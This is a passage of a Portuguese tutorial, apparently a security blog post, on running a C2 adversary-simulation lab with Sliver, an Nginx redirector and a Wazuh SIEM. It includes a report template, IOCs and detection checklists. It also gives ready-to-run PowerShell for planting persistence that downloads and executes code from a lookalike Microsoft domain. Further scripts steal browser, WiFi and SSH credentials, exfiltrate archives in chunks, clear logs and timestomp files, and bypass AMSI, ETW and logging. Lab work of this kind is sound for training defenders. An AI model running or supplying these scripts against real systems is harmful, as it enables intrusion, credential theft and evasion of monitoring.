# Relatório de Simulação C2 - [DATA]

## Executive Summary
- Objetivo da simulação
- Duração do exercício
- Sistemas comprometidos
- Técnicas utilizadas (MITRE ATT&CK)

## Infraestrutura Utilizada
### Topologia de Rede
[Diagrama da topologia]

### Componentes
- C2 Server: 10.99.99.10
- Redirector: 192.168.20.10
- Vítimas: 192.168.100.101, 192.168.100.102
- SIEM: 192.168.100.200

## Timeline do Ataque
| Timestamp | Ação | Técnica MITRE | Detectado? |
|-----------|------|---------------|------------|
| 14:30:15 | Initial Access | T1566 | ❌ |
| 14:30:45 | Execution | T1059.001 | ✅ |
| 14:32:10 | Persistence | T1053.005 | ✅ |
| 14:35:20 | Credential Dumping | T1003 | ✅ |
| 14:40:30 | Lateral Movement | T1021.006 | ✅ |

## Técnicas Detectadas vs Não Detectadas
### Detectadas ✅
- PowerShell execution com parâmetros suspeitos
- Credential dumping (Mimikatz)
- Lateral movement via WMI
- Persistence mechanisms

### Não Detectadas ❌
- Initial phishing page
- C2 communication (encrypted via VPN)
- Some evasion techniques

## Recomendações
1. **Network Segmentation**: Isolar DMZ do Corp Network
2. **Application Whitelisting**: Bloquear PowerShell para usuários normais
3. **Endpoint Detection**: Deploy EDR em todos endpoints
4. **User Training**: Simulações de phishing regulares

## Apêndices
- A: Logs completos
- B: Regras Wazuh implementadas
- C: IOCs identificados
```

### 18.3 IOCs (Indicators of Compromise)

```yaml
# IOCs.yaml
network:
  domains:
    - microsoft-cdn.com
    - updates.microsoft-cdn.com
  ips:
    - 192.168.20.10
    - 10.88.88.1
  
file_hashes:
  md5:
    - <hash_do_implant.exe>
  sha256:
    - <hash_do_implant.exe>

file_paths:
  - C:\Windows\Temp\svchost.exe
  - C:\Windows\Temp\.cache
  - C:\PSTranscripts

registry_keys:
  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
  - HKCU\Software\Classes\ms-settings\shell\open\command

scheduled_tasks:
  - WindowsUpdate
  - WindowsDefenderUpdate

services:
  - WindowsDefenderUpdate

user_agents:
  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
  - "C2-Implant-UA/1.0"

commands:
  - "powershell -NoP -W Hidden -Exec Bypass"
  - "irm https://microsoft-cdn.com/api/v1/updates"
  - "VirtualAlloc"
  - "sekurlsa::logonpasswords"
```

---

## FASE 19: Destruição do Ambiente

### 19.1 Desligamento Controlado

```bash
# 1. No C2 Server - Encerrar sessões
sliver > sessions -K

# 2. Parar serviços
sudo systemctl stop sliver-server
sudo systemctl stop c2-payload
sudo systemctl stop wg-quick@wg0

# 3. No Redirector
sudo systemctl stop nginx
sudo systemctl stop wg-quick@wg0

# 4. Nos Clientes Windows - Executar cleanup.ps1
# (script da FASE 16.5)
```

### 19.2 Snapshot para Análise Posterior

**Antes de destruir, tirar snapshots:**

1. VMware → VM → Snapshot → Take Snapshot
2. Nome: "Post-C2-Simulation-[DATA]"
3. Description: "Estado após simulação completa de C2"

### 19.3 Resetar Ambiente

```powershell
# Windows Clients - Reset completo
# Via VMware: Restore to clean snapshot

# Ou manualmente:
sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth
```

---

## RESUMO DE COMANDOS RÁPIDOS

### Inicialização Rápida do Lab

```bash
# C2 Server
sudo systemctl start wg-quick@wg0
sudo sliver-server daemon &
sudo systemctl start c2-payload

# Redirector
sudo systemctl start wg-quick@wg0
sudo systemctl start nginx

# SIEM
sudo systemctl start wazuh-manager
sudo systemctl start wazuh-indexer
sudo systemctl start wazuh-dashboard

# Verificar tudo
ping 10.88.88.1  # Do redirector para C2
curl -k https://microsoft-cdn.com  # Teste de proxy
```

### Testes de Conectividade

```bash
# No Redirector, testar túnel VPN
sudo wg show
ping 10.88.88.1

# Testar proxy reverso
curl -k -H "X-C2-Auth: Bearer-C2-TOKEN-12345" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
     https://localhost/api/v1/updates

# Do CLIENT01, testar DNS
nslookup microsoft-cdn.com
```

### Troubleshooting Comum

**Problema: WireGuard não conecta**
```bash
# Verificar firewall
sudo ufw status
sudo ufw allow 51820/udp

# Ver logs
sudo journalctl -u wg-quick@wg0 -f

# Restart
sudo systemctl restart wg-quick@wg0
```

**Problema: Nginx retorna 502**
```bash
# Verificar backend
curl http://10.88.88.1:8080/health

# Ver logs
sudo tail -f /var/log/nginx/c2-error.log

# Testar config
sudo nginx -t
```

**Problema: Sliver não recebe conexão**
```bash
# Verificar listeners
sliver > jobs

# Restart listener
sliver > https --lhost 10.88.88.1 --lport 443

# Verificar firewall
sudo ufw status
```

---

## MITRE ATT&CK Mapping Completo

| Tática | Técnica | ID | Implementado |
|--------|---------|----|----|
| **Initial Access** | Phishing | T1566 | ✅ ClickFix |
| **Execution** | PowerShell | T1059.001 | ✅ |
| **Execution** | Command and Scripting Interpreter | T1059 | ✅ |
| **Persistence** | Scheduled Task | T1053.005 | ✅ |
| **Persistence** | Registry Run Keys | T1547.001 | ✅ |
| **Persistence** | Create or Modify System Process | T1543.003 | ✅ Service |
| **Privilege Escalation** | Bypass UAC | T1548.002 | ✅ FodHelper |
| **Defense Evasion** | Obfuscated Files or Information | T1027 | ✅ Base64 |
| **Defense Evasion** | Process Injection | T1055 | ✅ Shellcode |
|| **Defense Evasion** | Hide Artifacts | T1564 | ✅ Hidden files |
| **Defense Evasion** | Indicator Removal | T1070 | ✅ Log clearing |
| **Credential Access** | OS Credential Dumping | T1003 | ✅ Mimikatz |
| **Credential Access** | Steal or Forge Kerberos Tickets | T1558.001 | ✅ Golden Ticket |
| **Credential Access** | Kerberoasting | T1558.003 | ✅ Rubeus |
| **Discovery** | System Network Configuration Discovery | T1016 | ✅ |
| **Discovery** | Remote System Discovery | T1018 | ✅ |
| **Discovery** | Account Discovery | T1087 | ✅ Domain enum |
| **Discovery** | Process Discovery | T1057 | ✅ |
| **Lateral Movement** | Remote Services - WMI | T1021.006 | ✅ |
| **Lateral Movement** | Remote Services - SMB | T1021.002 | ✅ PSExec |
| **Collection** | Archive Collected Data | T1560 | ✅ Compression |
| **Command and Control** | Application Layer Protocol - HTTPS | T1071.001 | ✅ |
| **Command and Control** | Encrypted Channel | T1573 | ✅ WireGuard |
| **Command and Control** | Proxy | T1090 | ✅ Nginx |
| **Exfiltration** | Exfiltration Over C2 Channel | T1041 | ✅ |
| **Exfiltration** | Exfiltration Over Alternative Protocol | T1048 | ✅ DNS |
| **Impact** | Data Encrypted for Impact | T1486 | ⚠️ Opcional |

---

## FASE 20: Testes Avançados de Detecção

### 20.1 Simulação de APT (Advanced Persistent Threat)

**Cenário: Compromisso de longo prazo com múltiplas técnicas**

```bash
# Timeline de 7 dias simulada
# Dia 1: Initial Access + Reconnaissance
# Dia 2: Estabelecer persistência
# Dia 3: Credential harvesting
# Dia 4: Lateral movement
# Dia 5: Data collection
# Dia 6: Exfiltration
# Dia 7: Cleanup e manutenção de backdoor
```

**Script de automação APT:**

```powershell
# apt-simulation.ps1
# Execute no CLIENT01

param(
    [int]$Day = 1
)

function Log-Activity {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File C:\Windows\Temp\.apt-log.txt -Append
}

switch($Day) {
    1 { # Reconnaissance
        Log-Activity "Day 1: Starting reconnaissance"
        
        # System info
        systeminfo | Out-File C:\Windows\Temp\.sysinfo.txt
        
        # Network discovery
        net view /domain | Out-File C:\Windows\Temp\.domain.txt
        
        # User enumeration
        net user /domain | Out-File C:\Windows\Temp\.users.txt
        
        # Process discovery
        Get-Process | Out-File C:\Windows\Temp\.processes.txt
        
        Start-Sleep -Seconds 300
    }
    
    2 { # Persistence
        Log-Activity "Day 2: Establishing persistence"
        
        # Multiple persistence mechanisms
        # Scheduled task
        schtasks /create /tn "MicrosoftEdgeUpdate" /tr "powershell -NoP -W Hidden -c `"irm https://microsoft-cdn.com/api/v1/updates|iex`"" /sc daily /st 09:00 /ru SYSTEM /f
        
        # Registry run key
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /t REG_SZ /d "powershell -NoP -W Hidden -c `"irm https://microsoft-cdn.com/api/v1/updates|iex`"" /f
        
        # WMI event subscription (stealth)
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = "SystemPerformanceMonitor"
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = "SystemPerformanceConsumer"
            CommandLineTemplate = "powershell.exe -NoP -W Hidden -c `"irm https://microsoft-cdn.com/api/v1/updates|iex`""
        }
        
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
        
        Start-Sleep -Seconds 180
    }
    
    3 { # Credential Access
        Log-Activity "Day 3: Credential harvesting"
        
        # Browser credential theft
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if(Test-Path $chromePath) {
            Copy-Item $chromePath C:\Windows\Temp\.chrome-creds.db
        }
        
        # Saved credentials
        cmdkey /list | Out-File C:\Windows\Temp\.saved-creds.txt
        
        # WiFi passwords
        netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $profile = ($_ -split ":")[-1].Trim()
            netsh wlan show profile name=$profile key=clear
        } | Out-File C:\Windows\Temp\.wifi-creds.txt
        
        Start-Sleep -Seconds 600
    }
    
    4 { # Lateral Movement
        Log-Activity "Day 4: Lateral movement"
        
        # Scan network for targets
        1..254 | ForEach-Object {
            $ip = "192.168.100.$_"
            if(Test-Connection -ComputerName $ip -Count 1 -Quiet) {
                $ip | Out-File C:\Windows\Temp\.live-hosts.txt -Append
            }
        }
        
        # Attempt lateral movement
        $targets = Get-Content C:\Windows\Temp\.live-hosts.txt -ErrorAction SilentlyContinue
        foreach($target in $targets) {
            # Check if admin share accessible
            if(Test-Path "\\$target\C$") {
                "Accessible: $target" | Out-File C:\Windows\Temp\.accessible-hosts.txt -Append
            }
        }
        
        Start-Sleep -Seconds 900
    }
    
    5 { # Collection
        Log-Activity "Day 5: Data collection"
        
        # Create staging directory
        New-Item -Path C:\Windows\Temp\.staging -ItemType Directory -Force | Out-Null
        
        # Collect documents
        Get-ChildItem C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt -ErrorAction SilentlyContinue | 
            Where-Object {$_.Length -lt 10MB} |
            Copy-Item -Destination C:\Windows\Temp\.staging -Force -ErrorAction SilentlyContinue
        
        # Collect browser history
        $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if(Test-Path $historyPath) {
            Copy-Item $historyPath C:\Windows\Temp\.staging\browser-history.db -ErrorAction SilentlyContinue
        }
        
        # Collect SSH keys
        if(Test-Path "$env:USERPROFILE\.ssh") {
            Copy-Item "$env:USERPROFILE\.ssh\*" C:\Windows\Temp\.staging -Force -ErrorAction SilentlyContinue
        }
        
        Start-Sleep -Seconds 1200
    }
    
    6 { # Exfiltration
        Log-Activity "Day 6: Data exfiltration"
        
        # Compress collected data
        if(Test-Path C:\Windows\Temp\.staging) {
            Compress-Archive -Path C:\Windows\Temp\.staging\* -DestinationPath C:\Windows\Temp\backup-$(Get-Date -Format 'yyyyMMdd').zip -Force
        }
        
        # Exfiltrate via chunks (simulate slow exfil)
        $archiveFile = Get-Item C:\Windows\Temp\backup-*.zip -ErrorAction SilentlyContinue
        if($archiveFile) {
            $bytes = [System.IO.File]::ReadAllBytes($archiveFile.FullName)
            $base64 = [Convert]::ToBase64String($bytes)
            
            # Split into chunks
            $chunkSize = 1000
            for($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
                $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
                
                # Simulate slow exfil over time
                try {
                    Invoke-RestMethod -Uri "https://microsoft-cdn.com/upload" `
                        -Method POST `
                        -Body $chunk `
                        -Headers @{
                            'X-C2-Auth' = 'Bearer-C2-TOKEN-12345'
                            'X-Chunk' = "$i"
                        } -ErrorAction SilentlyContinue
                } catch {}
                
                Start-Sleep -Seconds 30
            }
        }
    }
    
    7 { # Maintenance & Cleanup
        Log-Activity "Day 7: Maintenance and selective cleanup"
        
        # Remove obvious artifacts but keep backdoors
        Remove-Item C:\Windows\Temp\.staging -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Temp\backup-*.zip -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Temp\.sysinfo.txt -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Temp\.domain.txt -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Temp\.users.txt -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Temp\.processes.txt -Force -ErrorAction SilentlyContinue
        
        # Keep persistence mechanisms intact
        # Clear specific event logs
        wevtutil cl "Windows PowerShell"
        wevtutil cl "Microsoft-Windows-PowerShell/Operational"
        
        # Modify timestamps to blend in
        $persistFiles = @(
            "C:\Windows\Temp\.apt-log.txt",
            "C:\Windows\Temp\.chrome-creds.db"
        )
        
        foreach($file in $persistFiles) {
            if(Test-Path $file) {
                $item = Get-Item $file -Force
                $item.CreationTime = (Get-Date).AddDays(-30)
                $item.LastWriteTime = (Get-Date).AddDays(-30)
                $item.LastAccessTime = (Get-Date).AddDays(-1)
            }
        }
    }
}

Log-Activity "Completed Day $Day activities"
```

### 20.2 Testes de Evasão EDR

**Script para testar bypass de detecções:**

```powershell
# edr-evasion-tests.ps1

# Test 1: AMSI Bypass
function Test-AMSIBypass {
    Write-Host "[*] Testing AMSI Bypass..." -ForegroundColor Yellow
    
    # Método 1: Memory Patch
    $a = 'System.Management.Automation.A'
    $b = 'msiUtils'
    $c = 'amsiInitFailed'
    $d = "{0}{1}" -f $a,$b
    
    try {
        [Ref].Assembly.GetType($d).GetField($c,'NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass successful" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass failed" -ForegroundColor Red
        return $false
    }
}

# Test 2: ETW Bypass
function Test-ETWBypass {
    Write-Host "[*] Testing ETW Bypass..." -ForegroundColor Yellow
    
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        $b = $a.GetField('etwProvider','NonPublic,Static')
        $c = $b.GetValue($null)
        [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($c,0)
        
        Write-Host "[+] ETW Bypass successful" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] ETW Bypass failed" -ForegroundColor Red
        return $false
    }
}

# Test 3: Script Block Logging Bypass
function Test-ScriptBlockLoggingBypass {
    Write-Host "[*] Testing Script Block Logging Bypass..." -ForegroundColor Yellow
    
    try {
        $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
        $value = $settings.GetValue($null)
        $value['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
        $value['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
        
        Write-Host "[+] Script Block Logging Bypass successful" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] Script Block Logging Bypass failed" -ForegroundColor Red
        return $false
    }
}

# Test 4: Constrained Language Mode Check
function Test-ConstrainedLanguageMode {
    Write-Host "[*] Checking Language Mode..." -ForegroundColor Yellow
    
    if($ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage') {
        Write-Host "[-] Running in Constrained Language Mode" -ForegroundColor Red
        
        # Attempt bypass
        try {
            $ctx = [Ref].Assembly.GetType('System.Management.Automation.SessionState').GetField('_context','NonPublic,Instance').GetValue($ExecutionContext.SessionState)
            $ctx.GetType().GetProperty('LanguageMode').SetValue($ctx, 'FullLanguage')
            
            if($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {
                Write-Host "[+] Language Mode bypass successful" -ForegroundColor Green
                return $true
            }
        } catch {
            Write-Host "[-] Language Mode bypass failed" -ForegroundColor Red
            return $false
        }
    } else {
        Write-Host "[+] Running in Full Language Mode" -ForegroundColor Green
        return $true
    }
}

# Test 5: Process Injection Detection
function Test-ProcessInjection {
    Write-Host "[*] Testing Process Injection detection..." -ForegroundColor Yellow
    
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Inject {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
"@
    
    try {
        Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
        Write-Host "[+] Process Injection APIs loaded (likely detected)" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Host "[-] Process Injection blocked" -ForegroundColor Red
        return $false
    }
}

# Test 6: Network Connection to C2
function Test-C2Connection {
    Write-Host "[*] Testing C2 connection..." -ForegroundColor Yellow
    
    try {
        $response = Invoke-WebRequest -Uri "https://microsoft-cdn.com" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Host "[+] C2 connection successful (likely detected)" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Host "[-] C2 connection blocked" -ForegroundColor Red
        return $false
    }
}

# Run all tests
Write-Host "`n=== EDR Evasion Test Suite ===" -ForegroundColor Cyan
Write-Host "Testing common evasion techniques...`n" -ForegroundColor Cyan

$results = @{
    'AMSI Bypass' = Test-AMSIBypass
    'ETW Bypass' = Test-ETWBypass
    'Script Block Logging Bypass' = Test-ScriptBlockLoggingBypass
    'Language Mode' = Test-ConstrainedLanguageMode
    'Process Injection' = Test-ProcessInjection
    'C2 Connection' = Test-C2Connection
}

Write-Host "`n=== Test Results ===" -ForegroundColor Cyan
$results.GetEnumerator() | ForEach-Object {
    $status = if($_.Value) { "PASS" } else { "FAIL" }
    $color = if($_.Value) { "Green" } else { "Red" }
    Write-Host "$($_.Key): $status" -ForegroundColor $color
}

# Detection likelihood score
$passCount = ($results.Values | Where-Object {$_}).Count
$totalTests = $results.Count
$detectionScore = [Math]::Round((($totalTests - $passCount) / $totalTests) * 100, 2)

Write-Host "`nDetection Likelihood: $detectionScore%" -ForegroundColor $(if($detectionScore -gt 50){"Red"}else{"Green"})
```

### 20.3 Testes de Resposta a Incidentes

**Checklist de validação:**

```markdown
## Incident Response Validation Checklist

### Detection Phase
- [ ] Alerta gerado em menos de 5 minutos após execução
- [ ] Múltiplas fontes correlacionadas (Sysmon + Wazuh + Network)
- [ ] Classificação correta da severidade
- [ ] MITRE ATT&CK mapping correto

### Analysis Phase
- [ ] Timeline de eventos precisa
- [ ] Identificação do vetor de ataque inicial
- [ ] Mapeamento completo de sistemas comprometidos
- [ ] Identificação de persistência

### Containment Phase
- [ ] Isolamento de rede executado
- [ ] Bloqueio de C2 communications
- [ ] Desativação de contas comprometidas
- [ ] Snapshot de sistemas para forense

### Eradication Phase
- [ ] Remoção de todos os implantes
- [ ] Remoção de mecanismos de persistência
- [ ] Reset de credenciais comprometidas
- [ ] Patch de vulnerabilidades exploradas

### Recovery Phase
- [ ] Restauração de sistemas
- [ ] Validação de limpeza
- [ ] Monitoramento aumentado
- [ ] Confirmação de ausência de atividade maliciosa

### Lessons Learned
- [ ] Documentação completa
- [ ] Identificação de gaps de detecção
- [ ] Atualização de playbooks
- [ ] Treinamento da equipe
```

### 20.4 Script de Validação Automatizada

```bash
#!/bin/bash
# validate-lab.sh
# Validar toda a infraestrutura do lab

echo "=== C2 Lab Validation Script ==="
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check functions
check_service() {
    if systemctl is-active --quiet $1; then
        echo -e "${GREEN}[✓]${NC} $1 is running"
        return 0
    else
        echo -e "${RED}[✗]${NC} $1 is NOT running"
        return 1
    fi
}

check_port() {
    if nc -z localhost $1 2>/dev/null; then
        echo -e "${GREEN}[✓]${NC} Port $1 is listening"
        return 0
    else
        echo -e "${RED}[✗]${NC} Port $1 is NOT listening"
        return 1
    fi
}

check_connection() {
    if ping -c 1 -W 2 $1 >/dev/null 2>&1; then
        echo -e "${GREEN}[✓]${NC} Can reach $1"
        return 0
    else
        echo -e "${RED}[✗]${NC} Cannot reach $1"
        return 1
    fi
}

# Determine which server we're on
if [ -f "/var/ossec/bin/wazuh-control" ]; then
    SERVER_TYPE="SIEM"
elif [ -f "/root/.sliver/configs/server.json" ]; then
    SERVER_TYPE="C2"
elif [ -f "/etc/nginx/sites-available/c2-redirector" ]; then
    SERVER_TYPE="REDIRECTOR"
else
    SERVER_TYPE="UNKNOWN"
fi

echo "Detected server type: $SERVER_TYPE"
echo ""

# Validation based on server type
case $SERVER_TYPE in
    "C2")
        echo "=== C2 Server Validation ==="
        check_service "wg-quick@wg0"
        check_port 51820
        check_port 8080
        check_connection "10.88.88.2"
        
        if [ -f "/var/www/c2-payload/serve.py" ]; then
            echo -e "${GREEN}[✓]${NC} Payload server script exists"
        else
            echo -e "${RED}[✗]${NC} Payload server script missing"
        fi
        
        if pgrep -f "sliver-server" >/dev/null; then
            echo -e "${GREEN}[✓]${NC} Sliver server is running"
        else
            echo -e "${YELLOW}[!]${NC} Sliver server is NOT running"
        fi
        ;;
        
    "REDIRECTOR")
        echo "=== Redirector Validation ==="
        check_service "nginx"
        check_service "wg-quick@wg0"
        check_port 80
        check_port 443
        check_connection "10.88.88.1"
        
        if nginx -t 2>/dev/null; then
            echo -e "${GREEN}[✓]${NC} Nginx configuration is valid"
        else
            echo -e "${RED}[✗]${NC} Nginx configuration has errors"
        fi
        
        if [ -f "/etc/nginx/ssl/c2.crt" ]; then
            echo -e "${GREEN}[✓]${NC} SSL certificate exists"
        else
            echo -e "${YELLOW}[!]${NC} SSL certificate missing"
        fi
        ;;
        
    "SIEM")
        echo "=== SIEM Validation ==="
        check_service "wazuh-manager"
        check_service "wazuh-indexer"
        check_service "wazuh-dashboard"
        check_port 1514
        check_port 1515
        check_port 55000
        check_port 443
        
        # Check if agents are connected
        AGENT_COUNT=$(/var/ossec/bin/agent_control -l 2>/dev/null | grep -c "Active")
        echo -e "${GREEN}[✓]${NC} $AGENT_COUNT agents connected"
        
        # Check custom rules
        if grep -q "100001" /var/ossec/etc/rules/local_rules.xml 2>/dev/null; then
            echo -e "${GREEN}[✓]${NC} Custom C2 detection rules present"
        else
            echo -e "${YELLOW}[!]${NC} Custom rules not found"
        fi
        ;;
        
    *)
        echo -e "${YELLOW}[!]${NC} Unknown server type - running basic checks"
        check_connection "8.8.8.8"
        ;;
esac

echo ""
echo "=== Network Connectivity ==="
check_connection "192.168.100.10"  # DC
check_connection "192.168.100.101" # CLIENT01
check_connection "192.168.100.102" # CLIENT02

echo ""
echo "=== Validation Complete ==="
```

### 20.5 Geração de Tráfego Benigno

Para testar falsos positivos:

```powershell
# benign-traffic-generator.ps1
# Gerar tráfego legítimo para testar falsos positivos

$activities = @(
    {
        # Legitimate PowerShell usage
        Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
        Get-Service | Where-Object {$_.Status -eq "Running"}
    },
    {
        # Legitimate network activity
        Test-Connection -ComputerName google.com -Count 4
        Resolve-DnsName microsoft.com
    },
    {
        # Legitimate file operations
        Get-ChildItem C:\Users\$env:USERNAME\Documents -Recurse | Measure-Object
        Get-Content C:\Windows\System32\drivers\etc\hosts
    },
    {
        # Legitimate system queries
        Get-WmiObject Win32_OperatingSystem
        Get-CimInstance Win32_ComputerSystem
    },
    {
        # Legitimate registry reads
        Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
        Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer"
    }
)

Write-Host "Generating benign traffic for false positive testing..." -ForegroundColor Cyan

1..50 | ForEach-Object {
    $activity = Get-Random -InputObject $activities
    & $activity
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
}

Write-Host "Benign traffic generation complete" -ForegroundColor Green
```

---

## CONCLUSÃO

Este laboratório completo oferece:

### ✅ Infraestrutura Completa
- C2 Server isolado via VPN
- Redirectors com proxy reverso
- Rede corporativa simulada com AD
- SIEM com detecção customizada

### ✅ Técnicas Implementadas
- 20+ técnicas MITRE ATT&CK
- Múltiplos vetores de persistência
- Lateral movement completo
- Data exfiltration

### ✅ Detecção e Resposta
- Regras customizadas Wazuh
- Correlação de eventos
- Timeline de ataque
- Incident response validation

### ✅ Documentação
- Comandos completos
- Scripts prontos
- Troubleshooting
- Relatórios

### 📊 Métricas de Sucesso

**Para considerar o lab bem-sucedido, você deve conseguir:**

1. ✅ Estabelecer conexão C2 sem exposição de IP real
2. ✅ Executar payload via ClickFix com sucesso
3. ✅ Detectar pelo menos 80% das técnicas no SIEM
4. ✅ Realizar lateral movement entre hosts
5. ✅ Exfiltrar dados simulados
6. ✅ Gerar relatório com MITRE ATT&CK mapping

### 🎯 Próximos Passos

1. **Expandir detecções**: Adicionar regras para técnicas não detectadas
2. **Automatizar resposta**: Implementar SOAR para resposta automática
3. **Threat Intelligence**: Integrar feeds de IOCs
4. **Purple Teaming**: Iterar entre ataque e defesa
5. **Compliance**: Validar contra frameworks (NIST, CIS)

---

**🔐 LEMBRE-SE: Este ambiente é EXCLUSIVAMENTE para fins educacionais e testes autorizados. Nunca use estas técnicas contra sistemas sem autorização explícita por escrito.**


---
{{< bs/alert warning >}}
{{< bs/alert-heading "Encontrou algum erro? Quer sugerir alguma mudança ou acrescentar algo?" >}}
Por favor, entre em contato comigo pelo meu <a href="https://www.linkedin.com/in/sandsoncosta">LinkedIn</a>.<br>Vou ficar muito contente em receber um feedback seu.
{{< /bs/alert >}}
